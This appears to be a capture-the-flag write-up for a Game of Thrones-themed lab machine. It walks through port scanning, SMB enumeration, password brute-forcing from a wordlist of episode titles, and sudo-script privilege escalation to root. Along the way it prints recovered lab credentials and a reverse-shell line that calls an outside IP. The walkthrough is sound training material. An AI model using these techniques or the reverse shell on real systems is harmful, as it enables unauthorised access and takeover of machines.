# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.107 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.088 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1029ms
rtt min/avg/max/mdev = 0.088/0.097/0.107/0.009 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 23:24 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 62:9A:AF:5B:68:57 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```
``` bash
sudo nmap -p22,80,139,445 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 23:25 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000027s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 39:f8:44:51:19:1a:a9:78:c2:21:e6:19:d3:1e:41:96 (ECDSA)
|_  256 43:9b:ac:9c:d3:0c:ad:95:44:3a:c3:fb:9e:df:3e:a2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Juego de Tronos
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 62:9A:AF:5B:68:57 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2026-10-11T02:25:23
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.71 seconds
```
# SMB enumeration
## Null session
### Shares
``` bash
smbmap -H 172.17.0.2

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shared                                                  NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.17.12-Debian)
        nobody                                                  NO ACCESS       Home Directories
[*] Closed 1 connections
```
### Users
``` bash
nxc smb 172.17.0.2 --users
SMB         172.17.0.2      445    7E96AAD53038     [*] Unix - Samba (name:7E96AAD53038) (domain:7E96AAD53038) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         172.17.0.2      445    7E96AAD53038     -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         172.17.0.2      445    7E96AAD53038     jon                           2024-07-16 20:25:59 0
SMB         172.17.0.2      445    7E96AAD53038     [*] Enumerated 1 local users: 7E96AAD53038
```
``` bash
enum4linux 172.17.0.2 | grep 'Local User'
S-1-22-1-1000 Unix User\jon (Local User)
S-1-22-1-1001 Unix User\aria (Local User)
S-1-22-1-1002 Unix User\daenerys (Local User)
S-1-5-21-1971456777-2240019399-523807635-501 7E96AAD53038\nobody (Local User)
S-1-5-21-1971456777-2240019399-523807635-1000 7E96AAD53038\jon (Local User)
```
Let's save these users in a file
``` bash
cat > users.txt << EOF
heredoc> jon
heredoc> aria
heredoc> daenerys
heredoc> nobody
heredoc> EOF
```
## Brute force
After some try with rockyou.txt it does not find valid credentials
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 1729]
dragon               (Status: 301) [Size: 309] [--> http://172.17.0.2/dragon/]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
Exploring /dragon directory found an interesting note
``` bash
curl http://172.17.0.2/dragon/EpisodiosT1
Estos son todos los Episodios de la primera  temporada de Juego de tronos.
Tengo la barra espaciadora estropeada por lo que dejare los nombres sin espacios, perdonad las molestias

seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```
Let's create a file with these episodes which probably are password.
``` bash
curl -s http://172.17.0.2/dragon/EpisodiosT1 | tail -n 10 > ep.txt
```
# SMB enumeration
## Brute force
Now i can try brute force smb again
``` bash
nxc smb 172.17.0.2 -u users.txt -p ep.txt
SMB         172.17.0.2      445    7E96AAD53038     [*] Unix - Samba (name:7E96AAD53038) (domain:7E96AAD53038) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         172.17.0.2      445    7E96AAD53038     [+] 7E96AAD53038\jon:seacercaelinvierno
```

## Jon session
### Shares
``` bash
smbmap -H 172.17.0.2 -u jon -p seacercaelinvierno

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        shared                                                  READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.17.12-Debian)
        jon                                                     READ ONLY       Home Directories
[*] Closed 1 connections
```
``` bash
smbclient //172.17.0.2/shared -U "jon%seacercaelinvierno"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Oct 10 23:55:15 2026
  ..                                  D        0  Tue Jul 16 17:25:59 2024
  proteccion_del_reino                N      313  Tue Jul 16 17:26:00 2024

                82380576 blocks of size 1024. 52478456 blocks available
smb: \> get proteccion_del_reino
getting file \proteccion_del_reino of size 313 as proteccion_del_reino (152.8 KiloBytes/sec) (average 152.8 KiloBytes/sec)
smb: \> exit
```
``` bash
cat proteccion_del_reino
Aria de ti depende que los caminantes blancos no consigan pasar el muro.
Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender.
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```
# SSH
## Decode base64
``` bash
echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d
hijodelanister
```
## Jon session
``` bash
ssh jon@172.17.0.2
```
# Privilege escalation
## Lateral movement: jon -> aria
``` bash
sudo -l
(aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```
``` bash
mv .mensaje.py .mensaje.py.bak
```
``` bash
cat > .mensaje.py << EOF
> import os
> os.execl("/bin/bash", "bash")
> EOF
```
``` bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```
## Lateral movement: aria -> daenerys
``` bash
sudo -l
(daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```
``` bash
sudo -u daenerys /usr/bin/ls -la /home/daenerys/
total 32
drwx------ 1 daenerys daenerys 4096 Jul 16  2024 .
drwxr-xr-x 1 root     root     4096 Jul 16  2024 ..
-rw-r--r-- 1 daenerys daenerys  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 daenerys daenerys 3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 daenerys daenerys  807 Mar 29  2024 .profile
drwxr-xr-x 1 root     root     4096 Jul 16  2024 .secret
-rw-rw-r-- 1 daenerys daenerys  277 Jul 16  2024 mensajeParaJon
``` 
``` bash
sudo -u daenerys /usr/bin/cat /home/daenerys/.secret
/usr/bin/cat: /home/daenerys/.secret: Is a directory
sudo -u daenerys /usr/bin/ls -la /home/daenerys/.secret/
total 12
drwxr-xr-x 1 root     root     4096 Jul 16  2024 .
drwx------ 1 daenerys daenerys 4096 Jul 16  2024 ..
-rwxr-xr-x 1 daenerys daenerys   57 Jul 16  2024 .shell.sh
```
``` bash
sudo -u daenerys /usr/bin/cat /home/daenerys/.secret/.shell.sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.234.42/443 0>&1
``` 
``` bash
sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro.
Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.

!drakaris!
```
``` bash
su daenerys
password: drakaris
```
## Lateral movement: daenerys -> root
``` bash
sudo -l
(ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```
``` bash
echo '/bin/bash -p' > .secret/.shell.sh
```
``` bash
cat .secret/.shell.sh
/bin/bash -p
```
``` bash
sudo -u root /usr/bin/bash /home/daenerys/.secret/.shell.sh
```
# Root
``` bash
whoami
root
```
